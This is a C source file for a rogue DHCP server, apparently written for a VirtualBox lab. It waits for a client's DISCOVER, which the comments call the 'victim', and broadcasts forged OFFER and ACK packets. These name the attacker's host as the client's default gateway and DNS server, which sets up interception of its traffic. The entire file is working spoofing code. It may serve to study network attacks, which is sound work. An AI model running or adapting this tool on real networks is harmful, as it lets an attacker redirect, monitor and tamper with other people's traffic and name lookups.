#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "DHCPmine.h"




char new_offer_ip[] = "192.168.56.100"; // IP address offered to victim
char fake_server_ip[] = "192.168.56.1"; // my fake DHCP server address
char fake_gateway[] = "192.168.56.1"; // Default gateway given to victim
char fake_dns[] = "192.168.56.1"; // DNS server given to vicim
char broadcast_net[] = "192.168.56.255"; // broadcast of network

char fake_dhcp_ip[] = "10.0.2.15";

/*
storage for the DHCP DISCOVER packet.

we need info because 
DHCP offer needs the same transaction ID and correct  MAC address
DHCP request will be checked against this client later
*/

struct dhcp_packet client_packet;


int create_socket(void){
    int sockfd;
    // UDP socket, reused address, send/receive broadcast packets
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);


    if(sockfd < 0){
        perror("socket");
        exit(1);
    }

    int enable = 1;

    // allows multiple processes to bind the same address, for testing
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable,sizeof(enable));
    // broadcast
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));


    const char *optdev = "vboxnet0"; 
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, optdev, strlen(optdev)) < 0) {
        perror("SO_BINDTODEVICE failed - make sure interface name is correct");
        exit(1);
    }

    struct sockaddr_in addr;
    memset(&addr,0,sizeof(addr));
    addr.sin_family = AF_INET;


    //DHCP server listens on port 67
    addr.sin_port = htons(DHCP_SERVER_PORT);
    // lsiten on all local interfaces
    addr.sin_addr.s_addr = INADDR_ANY;
    // socket to port 67, incoming DHCP broadcasts will arrive here
    if(bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("bind");
        exit(1);
    }

    return sockfd;
}

int receive_discover(int sockfd){
    struct sockaddr_in client;
    socklen_t len = sizeof(client);

    while(1){
        struct dhcp_packet packet;
        memset(&packet,0,sizeof(packet));
        // source address in client
        recvfrom(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&client, &len);

        // 1 = DISCOVER
        if(packet.options[6] != DHCP_DISCOVER)
            continue;

        // ignore marked packets
        if(packet.chaddr[0]==0xAA && packet.chaddr[1]==0xAA){
            continue;
        }


        // vicitm info 
        memcpy(&client_packet, &packet, sizeof(packet));
        print_packet(packet);
            
        return 0;
    }

}

// Sends DHCP offer, ip address for my own 
int send_offer(int sockfd){
    struct dhcp_packet offer;
    create_dhcp_reply(&offer,DHCP_OFFER);
    struct sockaddr_in broadcast;

    memset(&broadcast,0,sizeof(broadcast));
    broadcast.sin_family = AF_INET;
    broadcast.sin_port = htons(DHCP_CLIENT_PORT);

    // Broadcast because the client does not have an IP yet
    inet_pton(AF_INET, broadcast_net, &broadcast.sin_addr);

    broadcast.sin_addr.s_addr = INADDR_BROADCAST;

    sendto(sockfd, &offer, sizeof(offer), 0, (struct sockaddr *)&broadcast, sizeof(broadcast));

    return 0;
}

int receive_request(int sockfd) {
    struct dhcp_packet request;

    while(1) {
        recvfrom(sockfd, &request, sizeof(request), 0, NULL, NULL);

        // 0x63 0x82 0x53 0x63
        // Magic Cookie of DHCP packet
        if (request.options[0] != 0x63 || request.options[1] != 0x82 ||
            request.options[2] != 0x53 || request.options[3] != 0x63) {
            continue; 
        }

        int message_type = 0;
        unsigned int i = 4; // 4 byte magic cookie skip

        // While going through options 
        while (i < sizeof(request.options)) {
            uint8_t opt_code = request.options[i];

            if (opt_code == 255) { // Option 255 means End of Options
                break;
            }
            if (opt_code == 0) { // Option 0 is padding (1 byte long, no length field)
                i++;
                continue;
            }

            // for all other options, the next byte is the length
            uint8_t opt_len = request.options[i + 1];

            // Option 53 
            if (opt_code == 53 && opt_len == 1) {
                message_type = request.options[i + 2]; 
                break; 
            }

            // Jump to the next option
            i += 2 + opt_len;
        }

        // Check if the parsed message type is DHCP_REQUEST
        if (message_type != DHCP_REQUEST) {
            continue;
        }

        // MAC check from target VM
        if (memcmp(request.chaddr, client_packet.chaddr, 6) == 0) {
            print_packet(request);
            return 0; 
        }
    }
}



int send_ack(int sockfd){
    struct dhcp_packet ack;
    create_dhcp_reply(&ack, DHCP_ACK);

    struct sockaddr_in broadcast;
    memset(&broadcast,0,sizeof(broadcast));

    broadcast.sin_family = AF_INET;
    broadcast.sin_port = htons(DHCP_CLIENT_PORT);
    broadcast.sin_addr.s_addr = INADDR_BROADCAST;

    sendto(sockfd, &ack, sizeof(ack), 0, (struct sockaddr *)&broadcast, sizeof(broadcast));


    return 0;
}



// https://datatracker.ietf.org/doc/html/rfc2132

/*
creates DHCP offer or ACK packet
DHCP_OFFER = 2
DHCP_ACK   = 5
*/
void create_dhcp_reply(struct dhcp_packet *packet, int type) {

    memset(packet, 0, sizeof(*packet));

    // Copy of transaction info from the client 
    memcpy(packet, &client_packet, sizeof(*packet));
    packet->op = 2;   // BOOTREPLY

    // ip addreses to dhcp header
    inet_pton(AF_INET, new_offer_ip, &packet->yiaddr);
    inet_pton(AF_INET, fake_server_ip, &packet->siaddr);

    // Clear old options from the copied packet
    memset(packet->options, 0, sizeof(packet->options));

    // DHCP magic cookie
    packet->options[0] = 0x63;
    packet->options[1] = 0x82;
    packet->options[2] = 0x53;
    packet->options[3] = 0x63;

    int opt = 4;
    uint32_t tmp_ip; 

    // DHCP Message Type
    packet->options[opt++] = 53;
    packet->options[opt++] = 1;
    packet->options[opt++] = type; 

    // DHCP Server IP
    packet->options[opt++] = 54;
    packet->options[opt++] = 4;
    inet_pton(AF_INET, fake_server_ip, &tmp_ip); 
    memcpy(&packet->options[opt], &tmp_ip, 4);
    opt += 4;

    // Subnet mask 255.255.255.0  /24
    packet->options[opt++] = 1;
    packet->options[opt++] = 4;
    packet->options[opt++] = 255;
    packet->options[opt++] = 255;
    packet->options[opt++] = 255;
    packet->options[opt++] = 0;

    // Router
    packet->options[opt++] = 3;
    packet->options[opt++] = 4;
    inet_pton(AF_INET, fake_gateway, &tmp_ip);
    memcpy(&packet->options[opt], &tmp_ip, 4);
    opt += 4;

    // DNS
    packet->options[opt++] = 6;
    packet->options[opt++] = 4;
    inet_pton(AF_INET, fake_dns, &tmp_ip);
    memcpy(&packet->options[opt], &tmp_ip, 4);
    opt += 4;

    // Lease time
    packet->options[opt++] = 51;
    packet->options[opt++] = 4;
    uint32_t lease_time = htonl(86400); 
    memcpy(&packet->options[opt], &lease_time, 4);
    opt += 4;

    // End Option
    packet->options[opt] = 255;
}

// for debug
void print_packet(const struct dhcp_packet packet){
    printf("\nDHCP PACKET \n");
    printf("OP: %d\n",
           packet.op);
    printf("Hardware type: %d\n",
           packet.htype);
    printf("Hardware length: %d\n",
           packet.hlen);
    printf("Transaction ID: %u\n",
           ntohl(packet.xid));
    printf("IP: %s\n",
        inet_ntoa(packet.yiaddr));
    printf("Client MAC: ");
    for(int i=0;i<packet.hlen;i++)
    {
        printf("%02X ",
               packet.chaddr[i]);
    }
    printf("\n");
    printf("DHCP message type: %d\n",
           packet.options[6]);
    printf("\n");

}




int main(void){
    printf("DHCP server start\n");
    int sockfd = create_socket();
    printf("Waiting for DHCP Discover\n");
    receive_discover(sockfd);
    printf("Sending DHCP Offer\n");
    send_offer(sockfd);
    printf("Waiting for DHCP Request\n");
    receive_request(sockfd);
    printf("Sending DHCP ACK\n");
    send_ack(sockfd);
    close(sockfd);

    return 0;
}